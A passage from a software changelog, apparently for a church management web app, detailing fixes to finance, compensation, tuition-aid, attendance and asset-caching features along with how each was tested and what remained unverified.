further defects compounded it on the boxes still using `type="number"` (which included the
reported Health Opt-Out Cash box, never converted by FIN50): (a) `.value` returns `""` for a
mid-typed string like `"1234."`, so the stored figure is deleted and the box **blanks out**;
(b) `selectionStart` is `null` on a number input, so the existing caret-restore was silently
skipped and the cursor jumped to the end on every keystroke — making mid-string editing
impossible, which is the "typing backward" feel.

**Fixes.** (1) `finRerenderPlanningPreserveFocus()` (and its Planning-table twin) now capture and
restore the focused element's raw text alongside focus/caret/scroll — state still updates every
keystroke so the totals recompute live, but the box being typed in is never rewritten out from
under the user. One change covering every field at once. (2) The seven remaining `type="number"`
boxes in the Compensation card (Health Opt-Out Cash, District Base Salary, Pension %, Disability
%, Custom growth %, Other Benefits, Years Experience) converted to `type="text"` +
`inputmode` + the live sanitizer, which is what makes (1) possible and fixes the blanking and
caret-jumping.

**Scope — audited every Finance tab, the bug was confined to Compensation.** The user expected it
everywhere in Finance. It isn't: Planning cells already store the raw typed string (FIN45 did
that correctly), and the Property Valuation Calculator / Multi-Year Forecast only rewrite output
elements, never their own inputs. Every other `type="number"` in `js-finance.js` is read on blur
or on a button click and is never re-rendered mid-typing. Those were left alone rather than
changed for symmetry.

New `test/finance-input-typing.test.js` (10 tests) runs the real sanitizer and real handler out of
the built bundle, pins the pre-fix failure explicitly, and asserts structurally that no
Compensation input is `type="number"` and that both wrappers restore the focused value. Verified
non-vacuous by deliberately reverting each half of the fix and confirming the matching tests fail.
`npm test` (590/590), `node --check` on both built bundles. **Not verified**: a live browser.
### v1.136.0 — Tuition Aid: pipeline students' planned awards now shown, not silently excluded, from
the K-8/LHS/Total budget bars (2026-08-05)

Reported: "I have entered aid for WOL totalling $80,850 and this shows it on the bar as $70,150. How
off by $10k." Root cause confirmed by reading `tapUpdateGauges()`: the K-8/LHS/Total budget-used bars
are computed from `tapEnrolledActiveForYear()`, which deliberately excludes anyone still tagged
`pipeline` (a not-yet-enrolled kid tracked by birth year — see TAP16). TAP16-FIX1 later made those
pipeline preview rows fully editable for "what if enrolled" planning, but the typed amounts were
never counted in the real budget bar — by design, so an un-enrolled kid could never inflate the real
figure. That's exactly what the user was hitting: the three pipeline-badged rows in their screenshot
(Wohlstader/Asher, Knapp/Lawrence, Lee/Barron) had real dollar amounts typed into them ($4,500 +
$6,600 + $7,000 = $18,100), invisible anywhere in the totals.

Asked the user via `AskUserQuestion` how they wanted this resolved rather than guessing — three
options (merge into one total / show both kept separate / only count manually-overridden pipeline
rows). Chose **"show both, kept separate"**: the real enrolled total keeps driving the budget bar
exactly as before (so a kid who never actually enrolls still can't eat real budget), but a new line
under each gauge — `tap-k8-pipeline-note` / `tap-lhs-pipeline-note` / `tap-total-pipeline-note` —
now reads "+ $18,100.00 planned for 3 pipeline students not yet enrolled (not counted above)" whenever
any pipeline preview exists for the year being viewed. New shared `tapPipelinePreviewForYear(yearIdx)`
(returns `{k8, lhs}`, empty for the current year since pipeline entries never preview at idx 0) — used
by BOTH `tapRenderPlannerTables()` (the table rows, replacing its own inline copy of the same filter
logic) and `tapUpdateGauges()` (the new note lines), so the two can never disagree on which pipeline
rows are being shown/counted.

**Verified against the real assembled/served bundle**, not just source: a `vm`-based harness loads
`CHMS_APP_CORE_JS + CHMS_APP_EXT_JS` (the exact two files served to the browser) with a fake DOM,
builds a roster reproducing the report's exact numbers (3 real K-8 students + 3 pipeline previews
totaling $18,100 in typed awards), and confirms: the real gauge total stays unaffected by the pipeline
entries, the new note reports exactly "$18,100.00 planned for 3 pipeline students... (not counted
above)", and the note disappears entirely when viewing the current year (idx 0, where pipeline never
previews). `npm test` (580/580), `node --check` on both built app-JS bundles. **Not verified**: an
actual browser — same standing caveat as the rest of this planner. (`src/frontend/js-tuition-aid.js`,
`src/frontend/html-tabs.js`)

### v1.135.0 — Compensation: LCMS raise scenarios back to pure formula math, autosave for the whole
tab (2026-08-05)

Two more follow-ups, reported live against v1.134.0.

**"It's still not calculating the NEXT year salary — that's what this should do, using the district's
multiplier table."** The previous two rounds fixed "None (flat)" to show the real current-year
budget ($98,800 for Dinger) — correct, confirmed working. But the LCMS/SSA/Custom "raise" scenarios
had also been changed to grow FROM that real figure by a flat %, which produced a materially
different (and lower) number than the actual LCMS district formula the user hand-computed
($51,529 base × (2.01 experience + 0.05 attendance) = $106,149.74). Reverted: `finWorkerScenarioSalaryCents()`
now only uses the real actual/budget figure for the "None" column specifically; every other scenario
(LCMS Avg/SSA/Custom) is unconditionally computed straight from `finComputeLcmsSalary()` — the pure
district guideline formula for the target year — same as before the "grow from actual" feature was
ever added. Verified with a harness reproducing the user's exact numbers: None → $98,800.00 (real
budget), LCMS/SSA → $106,149.74 (the formula, matching the hand-calc exactly, identical to each other
since FY2027 already has an exact published base salary — expected, not a bug).

**"Changes are not saving when I checkbox or change a field."** The whole Compensation tab (Salary
Calculator roster, Health Insurance selection, Pension/Disability overrides, everything) had never
autosaved — same class of report the Church Budget Planning tab got before FIN47 added autosave
there. Rather than wire a debounced save into every individual handler (a lot of call sites), added
one `finSalaryScheduleAutoSave()` call inside the single shared `finRerenderPlanningPreserveFocus()`
that virtually every Compensation mutator already calls — covers every checkbox/field/dropdown in
one place. Also caught and fixed a real gap while auditing this: `finConcordiaFieldChange()` (the
Concordia Decision Support reference fields) never called ANY save function at all, silent or
otherwise — those fields were unsavable outright, not just missing autosave. `finSalarySaveData()`
(the manual button) and the new autosave now share one `finSalaryBuildSaveBody()` so they can't
drift. Verified with a harness: editing a roster field, toggling a checkbox, and editing a Concordia
field each fire exactly one debounced save call after ~900ms, none before.

`npm test` (580/580, no test changes needed), `node --check`, harnesses for both fixes described
above. Not verified in a live browser. (`src/frontend/js-finance.js`)

### v1.134.0 — Compensation: pull the real BUDGET figure (not YTD actual), switch dollar overrides
off type="number" for good (2026-08-05)

Two follow-ups after the user reproduced both v1.133.0 fixes live and found each one incomplete.

**Wrong figure pulled — $56,848 instead of $98,800 for Dinger.** v1.133.0 wired the "None (flat)"
basis to the linked account's `totalActualCents` — but for a fiscal year still in progress, "Actual"
means "what's been paid out so far this year," not the full annual figure; $56,848 was Dinger's
YTD spend through the current month, not his $98,800 annual budgeted salary. `totalActualCents`
renamed the lookup to `finAccountBudgetCentsForCode()`, now reading `totalBudgetCents` (falling back
to `totalActualCents` only when an account genuinely has no budget entered at all) — "what's
currently in the budget" means the Budget line, not YTD spend. Explanatory copy and the per-worker
source caption updated to say "budget" throughout, and to explicitly call out that YTD Actual is
deliberately NOT used here since it would understate a partial year.

**"The boxes still don't type correctly" even after the v1.133.0 id fix.** The id fix was real and
necessary but not sufficient — traced to `type="number"` inputs' well-documented cross-browser
quirks around `selectionStart`/`setSelectionRange` and value normalization, which a rerender-on-
every-keystroke architecture (needed so dependent totals recompute live) can trigger in ways this
session can't directly observe without a browser. Rather than keep chasing which specific number-
input quirk was still misbehaving, switched all 4 of this round's dollar-value inputs (Opt-Out
payment, Employee-Only premium, the "None" column's actual-salary override, the 3 Health Premium
lines) from `type="number"` to `type="text" inputmode="decimal"` with a new `finSanitizeDecimalInput()`
— the exact same "sanitize as typed" strategy this codebase already uses (and has proven works) for
the Church Budget Planning cells' `finPlanSanitizeWholeDollarInput()`, just allowing one decimal
point instead of whole-dollars-only. A text input has no number-input-specific selection/reformatting
quirks at all, sidestepping the whole bug class rather than continuing to patch around it.

`npm test` (580/580, no test changes needed), `node --check`, a harness confirming
`finAccountBudgetCentsForCode('58001')` now returns $98,800 (not $56,848) against a fixture mirroring
the reported account shape, and a keystroke-by-keystroke harness confirming the new sanitizer
round-trips a typed value exactly (including a trailing decimal point mid-type, which native
`type="number"` inputs can lose) and correctly cleans garbled input. Not verified in a live browser.
(`src/frontend/js-finance.js`)

### v1.133.0 — Compensation: salary basis now prefers a linked account's real actual, plus a
focus-loss bug swept across every input added this session (2026-08-05)

Two follow-ups, requested together, after walking through exactly how the numbers were computed.

**"The flat rate from 2026 should be what's currently in the budget ($98,800 for Dinger), not the
formula's $104,260."** The roster table already has an "FY{base} Acct Actual" reference column
pulling each worker's real actual salary from their linked payroll account (e.g. Dinger → account
`58001`) — but that figure was only ever a side-by-side reference, never actually used as the
computation basis. New `finAccountActualCentsForCode(code)` factors out that existing lookup so
`finWorkerScenarioSalaryCents()` can use it as the DEFAULT basis, with a clear 3-tier priority: (1) a
typed override in the "None (flat)" box, if entered; (2) otherwise, the linked account's real FY
actual — automatic, no typing required, this is the new behavior; (3) only if neither exists, the
LCMS district guideline formula (a benchmark, not necessarily real pay — last resort, not the
default). The explanatory copy above the scenario comparison table was rewritten to state this
priority order plainly, name which source is being used under each worker's name in the table
("from account 58001's real FY2026 actual"), and explain precisely why LCMS/SSA/Custom can still show
identical numbers in the one specific case that's still expected (falling all the way through to the
formula AND the target year already having its own exact published district base salary — growth
rate genuinely can't move a number that's pinned by the district's own table).

**"Every editable box on this page has the same typing bug as Disability."** Investigated broadly
rather than re-diagnosing Disability's already-fixed float-precision bug — found a second, more
widespread root cause specific to every input added THIS session (Health Opt-Out override,
Employee-Only Premium, the "None" column's actual-salary override, the Health Premium
Medical/Dental/Vision overrides): none of them had an `id` attribute. `finRerenderPlanningPreserveFocus()`
(the mechanism that's supposed to keep the cursor in place across a full-card rerender on every
keystroke) relocates the focused element by `document.getElementById(activeId)` — with no id, that
lookup fails silently, so the input loses focus entirely after the very first character typed,
forcing a re-click before every subsequent keystroke. Swept and confirmed every OTHER editable box on
this page (Valuation Calculator inputs, rent roll fields, the Church Budget Planning cells, the
Concordia estimate fields, Years Experience/Name/Acct#) either already has a stable id, or — like the
Valuation Calculator — never gets rerendered mid-edit in the first place (its change handler only
updates 4 output spans, never touches its own input elements), so those were never at risk. Added
unique ids (`fin-salary-optout-<i>`, `fin-salary-eo-<i>`, `fin-salary-actual-<i>`,
`fin-health-premium-<option>-<field>`) to the 4 real gaps. `npm test` (580/580, no test changes
needed), `node --check`, a harness confirming the account-actual basis correctly overrides the
formula (and a typed override still wins over that), and a harness rendering both affected cards and
confirming all 4 previously id-less inputs now carry stable, focus-preservable ids. Not verified in a
live browser. (`src/frontend/js-finance.js`)

### v1.132.0 — Compensation: actual-salary basis, family/employee-only/opt-out health tiers, and a
recurring input-reformat bug swept clean (2026-08-05)

Three follow-ups in one session, on the Disability/health work shipped earlier today.

**Bug: Disability % (and Custom %) input reformatted mid-keystroke, reading as "typing backward."**
Same root cause as the FIN42 District Reference Data bug, not yet applied to these two fields: the
value attribute forced `.toFixed(2)` on every render, and since the stored value is a fraction
(`pct/100`) round-tripped through float math, redisplaying it produced garbage like
`11.700000000000001` — a full card rerender on every `oninput` meant the user saw that garbage
appear mid-type. New `finFmtPctInput(fraction)` (`Math.round(fraction*10000)/100` — a clean rounded
*number*, not a zero-padded string) replaces the `.toFixed(2)` calls on both the Disability and
Custom-growth-% inputs (Pension already worked fine by luck but wasn't touched — no report against
it). Verified with a harness simulating keystroke-by-keystroke typing ("1" → "11" → "11." → "11.7")
against both the old and new formatting — old reproduces the corruption, new round-trips cleanly at
every step.

**"Changing the percentage does nothing, all scenarios are the same."** Root cause: FY2027 already
has an *exact* published LCMS district base salary figure, and the formula-based scenario columns
(LCMS Avg/SSA/Custom) all resolve to that same fixed number regardless of growth rate whenever the
target year already has one on file — documented in the card's own caption, but silently confusing
in practice, and compounding the real underlying complaint from earlier today (the LCMS *guideline*
salary for FY2026 doesn't match what Dinger is actually paid, $104,260 vs. his real $98,800). Fixed
both at once: new `finWorkerScenarioSalaryCents(worker, scenario, baseYear)` — when a worker has an
entered actual salary (new editable input, right in the "None (flat)" column of the scenario table,
placeholder shows the formula estimate for comparison), every scenario grows that REAL number by the
scenario's rate instead of touching the LCMS formula at all, so a percentage change now visibly
changes the number regardless of whether the target year has a published district figure. A "↺ use
formula" link clears the override. `finSalaryComputeAll` (the roster table / Total Compensation /
Apply-to-Plan path) and `finRenderSalaryScenarioComparison` both route through the same helper, so
they can't drift. Verified with a harness: before entering an actual salary, LCMS (2.35%) and SSA
(2.8%) both resolve to the identical $74,717.05 for Dinger (confirms the exact-year freeze); after
entering $98,800, LCMS gives $101,124.18 and SSA gives $101,566.40 — now genuinely different.

**Family / employee-only / opt-out health tiers, per worker.** The "Has Dependents" checkbox
(previously only affecting the Disability & Survivor rate) now doubles as the health-family flag,
per the user's confirmed default choice — one checkbox, not two. A family-coverage enrolled worker
still draws from the real group Family-tier premium quote (unchanged). Since no Employee-Only
premium data exists anywhere in this app (the quote is Family-tier-only), a non-family enrolled
worker instead gets a plain editable "Employee-Only Premium" dollar input (blank = $0, an admin
enters the real figure once known) right in the Health Plan cell. Opting a worker out now also
supports an optional PER-WORKER opt-out cash override (falls back to the existing shared
per-fiscal-year "Health Opt-Out Cash" figure when left blank, so nobody's behavior changes unless
this is explicitly set for them). All three tiers roll into a new "Total Health Plan Cost (all
workers)" line under the Total Compensation table, so the group total is visible in one place
instead of only per-worker. Verified with a harness covering all three tiers simultaneously (a
family worker, an employee-only worker with a $4,500 entered premium, and an opted-out worker with a
$3,000 entered opt-out payment) — each resolves to the correct, independent figure.

`npm test` (580/580, no test changes needed — this is all UI-layer/roster-field work with no new
pure functions under existing test coverage), `node --check`, confirmed all new function names
present in the assembled bundle. Not verified in a live browser. (`src/frontend/js-finance.js`)

### v1.131.0 — Church Budget Planning: autosave on cell edits (2026-08-05)

Reported: editing a Projected/Plan cell and then navigating away lost the edit — nothing saved until
an explicit "Save Changes" click. Every cell edit (`finPlanEditCell`/`finPlanEditBaseProjCell`) now
schedules a debounced (800ms after the last keystroke) background save, so a change reaches the
server within about a second regardless of whether "Save Changes" is ever clicked. Refactored the
duplicate row-collecting logic out of the old `finPlanSaveAll()` into a shared
`finPlanCollectPendingEdits()`, used by both the new `finPlanAutoSaveNow()` (deliberately does NOT
reload the table afterward — a full reload mid-typing would blow away in-progress edits/focus) and
the still-present manual Save button (which does reload, as before, for an explicit confirm-and-
refresh). Also added a `finPlanFlushAutoSave()` — clears the debounce timer and saves immediately —
called before both the base-year and target-year selectors change context (so a pending edit isn't
silently dropped when `_finPlanEdits` gets wiped for the new year) and before `finPlanCommit()` (so a
commit right after typing picks up the latest figures, since commit reads from what's already
persisted server-side, not the in-memory edit maps). `npm test` (580/580, no test changes needed —
pure UI-layer addition), `node --check`, and a harness against the actual served bundle confirming
the debounce (no call at 0ms, one call by 900ms) and the immediate flush-on-year-switch (edit saved
before the year context changes, edit map correctly empty afterward). Not verified in a live browser.
(`src/frontend/js-finance.js`)

### v1.130.0 — Compensation: editable Disability & Survivor rate + Health Insurance premium overrides;
Tuition Aid pipeline previews made fully editable (2026-08-05)

Two follow-ups reported in the same session.

**Compensation tab**: only Pension Contribution % had an editable override box — Disability &
Survivor's rate was always auto-looked-up (per worker, off the Has Dependents checkbox) with no way
to override it, and the Health Insurance Renewal Options card's Medical/Dental/Vision premium
figures were a hardcoded 2027 quote snapshot with no edit UI at all (flagged as a known gap back in
FIN42's notes — "a future idea, not built now"). The per-fiscal-year Health Opt-Out Cash figure the
user also asked about already existed (District Reference Data box, Salary Calculator card) — just
easy to miss since it sits grouped with Base Salary rather than near Pension. Added: (1) a
"Disability & Survivor Rate %" override input next to Pension (same null-means-auto-with-reset-link
pattern, applies one flat rate to every worker instead of the two dependents-based Concordia rates);
(2) editable Medical/Dental/Vision premium inputs for the currently-selected plan option on the
Health Insurance card (blank = use the quote's own figure, shown as a placeholder; a typed figure
overrides just that option/line, with a reset link). Both persist via the existing salary-planner
save/load endpoint. `npm test` (580/580 — one pre-existing test harness that evals an isolated
extract of `finComputeHealthPlanTotalCents` needed a `typeof` guard since it doesn't declare the new
override global; fixed). `node --check` on both touched files, confirmed all new function/variable
names appear in the assembled bundle. Not verified in a live browser. (`src/frontend/js-finance.js`)

**Tuition Aid Planner**: the pipeline future-year preview added earlier this session (below) was
initially read-only estimates with just an Enroll button — reported it should instead let an admin
click into a future year and actually adjust outside aid / family share / a manual Timothy Award for
that not-yet-enrolled kid, i.e. plan a real "what if enrolled this year" scenario. The preview row
now reuses the exact same editable inputs a real row has; they already save into the same per-year
"pin" mechanism a real student's future-year edit uses (`tapOutsideAidChange`/`tapSliderChange`
already routed there whenever viewing a non-current year, regardless of enrollment status) — only
`tapTimothyAwardChange` had an unconditional `isPipeline` bail that needed relaxing to
"pipeline AND current year" so a future-year manual award edit isn't blocked. Verified with a
harness: editing Outside Aid/Family %/Timothy Award on a preview row correctly writes an isolated
per-year pin (current year untouched, `is_pipeline` unaffected), and the pin's values correctly
round-trip back into the rendered inputs on the next render. `npm test` (580/580). Not verified in a
live browser. (`src/frontend/js-tuition-aid.js`)

### v1.129.0 — Tuition Aid Planner: future-year preview for pipeline entrants (2026-08-05)

Reported: Lawrence Knapp is tracked in the Pipeline (by birth year), and navigating the year
selector to the school year he should reach Kindergarten showed nothing — the only way to make him
appear was to first click "Enroll" for the *current* year, which enrolls him as a PK-grade student
he isn't actually attending (PK grades are filtered out of the K-8 table entirely, so this is
invisible either way, but it read as a false enrollment). By design (TAP11), a pipeline entrant
never appears in the real K-8/LHS planner tables for ANY year until formally Enrolled — being
age-eligible by birth year isn't the same as being enrolled — so there was no way to just *look
ahead* at a pipeline kid's projected placement without taking that action first.

Fix: `tapRenderPlannerTables()` now adds a second pass, only when viewing a future year
(`_tapYearIdx !== 0`), that includes any pipeline entrant whose birth-year-projected grade for that
year is a real, non-PK, non-Graduated K-8/LHS grade — rendered as a dimmed, italicized preview row
with a "pipeline" badge, estimated award figures (computed the same way a real row would be, via
the existing `tapSplitFor`/`tapLhsAwardFor`), and its own inline "Enroll" button (reusing the
existing `tapEnrollPipeline`, which always enrolls as of the *current* year's computed grade,
unchanged). This is purely a display addition — `tapUpdateGauges`/budget totals still read from
`tapEnrolledActiveForYear`, real enrollment only, so a preview row never inflates a year's actual
committed aid. Verified against the real served (built) script with a Node harness: a pipeline kid
correctly stays absent from the current year, appears as a preview with a working Enroll button once
the target year is K-eligible, and appears with no Enroll button (correctly) for a kid still too
young to enroll even this year. `npm test` (580/580, no test changes — pure display-layer addition
with no new pure functions), `node --check` on the touched file. Not verified in a live browser.
(`src/frontend/js-tuition-aid.js`)

### v1.128.0 — Church Budget Planning: weeks-based annualization, editable FY Projected column,
live-recomputing group totals, whole-dollar-only inputs (2026-08-05)

Reported live: the "FY2026 Projected" column on the Planning table's annualization looked off
(user's own hand-check — actual ÷ 7 completed months × 12 — didn't match). Root cause: the
annualization used the **current calendar month number** (`getMonth()+1` = 8, since it's Aug 5) as
the elapsed-months denominator, not the count of *completed* months (7) — a partial month is
inherently ambiguous (is day 5 of month 8 "1 month elapsed" or "0"?), and the code picked the
answer that understated the run rate. Per the user's suggestion, switched to **weeks elapsed**
(days since Jan 1 ÷ 7, capped at 52) instead of calendar months — unambiguous, and closer to this
church's actual weekly giving rhythm. New `weeksElapsedInYear()` (`src/api-finance.js`, used by the
`generate-all` endpoint — param renamed `through_month`→`through_week`) and a duplicate
`finWeeksElapsedInYear()` in `src/frontend/js-finance.js` (this file has no module system, so a
duplicate is the established pattern here, same as the months version before it).

Two follow-ups in the same conversation, both real bugs: (1) **The "FY{base} Projected" column had
no edit affordance at all** despite the request — `computeBaseProj` was wired to read an override
map that nothing ever set, and the rendered cell was a plain `$` span, not an input. Added a real
editable input per leaf row, a new `_finPlanBaseProjEdits` (unsaved) / saved-server-side pattern
mirroring the salary planner's chms_config JSON-blob convention — new
`GET`/`PUT /admin/api/finance/planning/base-projection`, keyed by base fiscal year so a saved
override never crosses years. (2) **Editing a Plan or Projected cell didn't update the group/
subtotal/Δ%/Net figures above it** (screenshot: typing 640000 into a leaf left its group's bold
subtotal row showing the old $510,000.00) — `finPlanEditCell` only ever mutated a JS object with no
re-render call at all, so the whole table (including bold rollup rows, which are computed once at
render time from the leaves) simply never recomputed until the next full page reload (Save or
changing the base/target year). Fixed by wiring both edit handlers to a new
`finRerenderPlanTablePreserveFocus()` — same focus/cursor/scroll-preservation technique FIN20
already built for the Compensation tab's per-keystroke re-render, applied here for the first time
to the Planning table itself. Every editable cell now carries a stable id
(`finPlanCellId()`) so a full innerHTML rebuild can find its way back to the field being typed in.

Also, per the same message: **both editable dollar columns are now whole-dollars-only** —
`finPlanSanitizeWholeDollarInput()` strips anything but digits (and one leading "-") as the user
types, so a decimal point can never actually land in the field (not just rounded after the fact).
Applied identically server-side (`Math.round(Number(x)) * 100` instead of `Math.round(Number(x) *
100)`) on `override-bulk` and the new `base-projection` PUT, for defense in depth against a
bypassed client.

`npm test` (580/580, 26 new/updated tests including an exact reproduction of the reported Aug-5
example — 217 days elapsed = exactly 31 weeks), `node --check` on both built app-JS bundles.
Caught and fixed, before shipping, a real instance of the project's own known backtick-in-comment-
breaks-the-outer-String.raw-literal bug class (this file's whole export is one `String.raw`
template) — a stray backtick in a new code comment silently truncated the served script; found by
running the actual test suite (Rolldown's parser errored on it), not by reading the diff. Also
caught a leftover reference to the old `baseThroughMonth` variable name in the column header
tooltip that would have thrown a `ReferenceError` at render time — found the same way, by rebuilding
and syntax-checking the actual served bundle rather than trusting the edit looked right. Not
verified in a live browser. (`src/api-finance.js`, `src/frontend/js-finance.js`,
`test/finance-budget-plan.test.js`)

### v1.123.0 — General Fund defined by numeric prefix, Finance-sourced budget, General-Fund-only
projection (2026-08-04)

Follow-up to v1.122.0's General Fund KPI split, after the user pointed out the totals didn't
reconcile and the Year-End Projection card ($505K) contradicted the YTD card's own -22% trend.
Root cause of both: v1.122.0's split matched funds by literal name (`/general\s*fund/i`), so it
only caught the one fund actually named "40085 General Fund" — missing every seasonal sub-fund
coded under the same "40085" number (Christmas Offering, Advent Offering, Easter Vigil, etc.),
which the Giving by Fund report already groups together by leading numeric code (G22's own
convention). Confirmed with the user: General Fund = every fund sharing that numeric prefix.

Rebuilt server-side in `GET /admin/api/reports/giving-board` (`src/api-reports.js`): the monthly
giving query now breaks out `fund_id` so a General-Fund-only monthly shape can be computed
alongside the all-funds one; a new `general_fund` block in the response carries YTD/prior/
other-giving/projection/budget all scoped to just the numeric-prefix-matched fund family. Two
real fixes bundled in: (1) **Year-End Projection is now General-Fund-only**, computed from the
General Fund's own prior-year monthly shape — previously it silently used the all-funds
projection, which could show growth even while General Fund itself was down, since other funds
(a one-time building gift, etc.) skewed the blended total. (2) **Vs. Budget YTD now reads from
Finance → Church Report** — a new query against `finance_church_entries` (period_month=0,
precedence-resolved same as the Church Report's own read paths) matches the account whose name
starts with the same numeric code (e.g. "40085 Sunday Offering") and spreads its budget across the
year using the General Fund's own seasonal shape, instead of requiring a separate fund-level
budget in Settings → Manage Funds. Frontend (`src/frontend/js-giving.js`) simplified to read the
new `general_fund` object directly instead of re-deriving the split client-side. `npm test`
(504/504, 4 new integration tests in `test/giving-board-general-fund.test.js` against a real
in-memory SQLite DB — the general-fund/other-fund split, the projection using a genuinely
different basis than the all-funds figure, the Church Report budget match, and the null-not-$0
fallback when no matching account exists). Caught and fixed one instance of the SC3-BUG1/TAP-series
backtick-in-`String.raw`-comment bug class before shipping (a literal backtick in a new
`js-giving.js` comment prematurely closed the file's outer template literal — caught by `npm test`
itself failing to parse the file, not just `node --check`). Not verified in a live browser.
(`src/api-reports.js`, `src/frontend/js-giving.js`, `test/giving-board-general-fund.test.js`)

### v1.122.0 — Attendance YTD chart, cross-tab print leak, General Fund KPI split, year-end
projection fallback (2026-08-04)

Four reported issues, addressed together. (1) **Attendance "This Week" bar chart** was fixed at
"Last 26 Sundays" with gold/teal bars colored by whether that Sunday beat its own trailing 4-week
average — changed to show every Sunday recorded **this calendar year** (YTD), and each bar is now
a stacked 8:00 (bottom, gold)/10:45 (top, teal) split instead of a single combined bar colored by
a pace comparison. `attRenderBars26()` in `src/frontend/js-attendance.js`; new `.att-bar-stack`/
`.att-bar-seg-8`/`.att-bar-seg-1045` CSS. (2) **Print bug**: printing from Finance (Church Report,
Commercial Property) also printed whatever was rendered in the Attendance tab underneath it. Root
cause: the `@media print` block in `html-head.js` force-showed a hardcoded whitelist of 5 tab ids
(`#tab-reports`/`#tab-finance`/`#tab-scheduler`/`#tab-giving`/`#tab-attendance`) all at once,
because Church Report/Commercial Property just call plain `window.print()` with no scoping class —
so every one of those 5 tabs printed simultaneously regardless of which was actually open. Fixed to
key off `.tab-panel.active` (only the currently-open tab) instead of the whitelist; `#tab-giving`
stays force-hidden by default since normal Giving-tab printing still needs to go through
`printBoardPage()`'s `body.printing-board` mechanism, unchanged. (3) **Giving Board Report
Dashboard**: the "Given year to date" KPI card lumped every fund into one total. Split into
"General Fund YTD" (matched by name, `/general\s*fund/i`, same convention as the rest of the app)
as the primary figure, with a sub-line folding every other fund into "+ $X other giving (N funds)
= $Y total" and a YoY delta computed from the General Fund's own actual/prior figures rather than
the blended total. New `boardGeneralFundSplit()` in `src/frontend/js-giving.js` — display-only,
reads the same `d.funds` array the endpoint already returns, no backend change. **Budget YTD**
(same card) still requires a fund-level `budget_annual_cents` set in Settings → Manage Funds — the
request to have it pull from the Finance tab's uploaded Church Report budget instead needs a
decision on which Church Report account represents "General Fund" giving (there's no existing
link between the `funds` table and `finance_church_entries` account rows), flagged for a follow-up
rather than guessed. (4) **Finance Overview "Projected Year-End" showing "Not yet available"**:
that KPI (`computeYtdComparison`) has always deliberately required monthly-granularity rows
(`period_month` 1-12) for both this year and last year — but this church settled on annual-only
Excel imports (see FIN36 in CLAUDE.md), which store `period_month=0`, so the monthly comparison
never had data to run on. New `fallbackAnnualProjection()` in `src/api-finance.js`: when no
monthly rows exist, projects a straight-line estimate off the annual actual-to-date total instead
(`actual * 12/monthsElapsed`) — less accurate than the seasonal prior-year-ratio (no month-shape
awareness), but a real number instead of a permanent blank. Marked `seasonal:false` in the
response; the KPI chip and the Year-End Projection card both now say "(straight-line estimate)"
when this path is used, so it's never presented as more precise than it is. `npm test` (508/508,
4 new tests in `test/finance-church.test.js`), `node --check` on both rebuilt app-JS bundles. Not
verified in a live browser. (`src/frontend/js-attendance.js`, `src/frontend/html-head.js`,
`src/frontend/js-giving.js`, `src/api-finance.js`, `test/finance-church.test.js`)

### v1.127.1 — Fix the root cause of poisoned immutable asset URLs (2026-08-04)

v1.126.1 recorded this as a tooling hazard and changed how deploys are verified. **That was not
enough — it happened again on the v1.127.0 deploy**, this time using the "safe" method:

```
probe URL      -> 112,861 bytes, MOB2 present   (what the worker actually generates)
?v=1.127.0     -> 110,799 bytes, MOB2 absent    (v1.126.1's CSS, pinned)
/sw.js         -> VERSION = '1.127.0'
```

Polling `/sw.js` confirms the version **at the edge that answered that request**. Cloudflare rolls
out per-colo, so the very next request can still land on an edge running the previous worker. No
client-side verification order can close that window — which also means **a real user loading the
page mid-rollout poisons their own edge the same way**, for a year, with no action on their part.

**Root-cause fix, server-side.** The three versioned asset routes now emit
`public, max-age=31536000, immutable` **only when `?v=` equals the worker's own
`DEPLOY_VERSION`**, and `no-store` otherwise:

```js
const assetCacheControl = () =>
  url.searchParams.get('v') === DEPLOY_VERSION
    ? 'public, max-age=31536000, immutable'
    : 'no-store';
```

Mid-rollout, an old worker asked for the new version returns `no-store`, so nothing can be pinned.
The mirror case is covered too: a new worker answering a stale page's old-version request serves
the NEW body, which is equally wrong to store under the old URL. The body is always served either
way — availability never depends on the version matching, only cacheability does. Once a rollout
completes every request matches and normal year-long caching resumes unchanged.

`DEPLOY_VERSION` is now imported into `tlc-volunteer-worker.js` (it previously only reached the
worker indirectly, interpolated into `CHMS_HTML`).

**Verified:** `npm test` 572/572, 7 new in `test/asset-cache-policy.test.js` exercising the real
worker fetch handler — immutable on an exact match, `no-store` for a newer version, an older
version and no version at all, identical body in every case, and content types preserved.
Re-verified by restoring the unconditional header and confirming the three mismatch tests go red.

**Note on the two already-poisoned URLs.** `app.css?v=1.126.0` and `?v=1.127.0` are pinned at
those edges until their TTL expires; a version bump is the only way past them, which is what
1.127.1 is. From this release forward the window cannot be entered at all.

### v1.127.0 — MOB2: wide tables scroll instead of widening the page (2026-08-04)

**55 of the app's 99 tables had no horizontal scroll container** — `js-reports.js` 20 bare of 23,
`js-finance.js` 16 of 40, `js-attendance.js` 5 of 5. A bare wide table does not scroll: it widens
the **page**, so the whole layout shifts and the user can pan the entire UI sideways with no
obvious way back. That is the worst-feeling class of mobile breakage, and it was the last open
item from the mobile scope.

**One descendant rule, not 55 markup edits**, for a concrete reason: **65 of the 99 tables carry
no CSS class at all** — they are built with inline styles in JS string concatenation — so a
class-targeted rule would reach barely a third, and hand-editing 55 call sites is both expensive
and exactly the kind of change that regresses silently.

```
@media(max-width:767px){
  .content-area table:not(.dir-table),
  .modal table:not(.dir-table){display:block;overflow-x:auto;max-width:100%;}
}
```

Four deliberate choices:
- **Phone-scoped.** The defect only exists where the viewport is narrower than the table, so
  desktop keeps normal table layout entirely untouched and the blast radius is limited to where
  the bug lives.
- **`.content-area` + `.modal`.** The former covers tab panels, the profile view and the
  household/organization views; modals are `position:fixed` and sit outside it, so they need
  naming separately.
- **`.dir-table` excluded.** Its `<th>` uses `position:sticky` for a frozen header, which
  `display:block` defeats. It is the desktop People table and is already `display:none` on
  phones, so excluding it costs nothing.
- **No `white-space:nowrap`.** Letting cells wrap means a table that *can* fit still fits, and
  only genuinely wide ones scroll — gentler than forcing every table into a scroller.

**A test that would have passed for no reason, caught and rewritten.** The first placement test
asserted the block sits after the base table rules — reflexively, after v1.121.4. Deliberately
breaking it proved the assertion was vacuous: moving the block earlier changed nothing. The real
mechanism is specificity, not order. The only base rule touching overflow on a table selector is
`.reg-table{overflow:hidden}` — one class, (0,1,0) — while this rule is `.content-area table`, a
class plus an element, (0,1,1), so it wins regardless of position. The tests now assert that
mechanism instead of an ordering constraint that does not exist.

**Verified:** `npm test` 565/565, 11 new in `test/mobile-table-scroll.test.js`. Re-verified against
